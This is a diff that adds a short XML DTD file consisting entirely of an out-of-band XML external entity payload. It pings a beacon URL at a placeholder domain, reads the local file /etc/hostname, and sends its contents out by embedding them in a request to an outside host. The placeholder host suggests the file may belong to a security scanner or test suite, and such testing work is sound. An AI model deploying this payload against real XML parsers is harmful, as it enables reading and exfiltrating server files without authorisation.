@@ -1,0 +1,7 @@
+<!ENTITY % b "<!ENTITY &#x25; bb SYSTEM 'http://beacon.DOMAIN/'>">
+%b;
+%bb;
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://meow.%file;'>">
+%eval;
+%exfil;
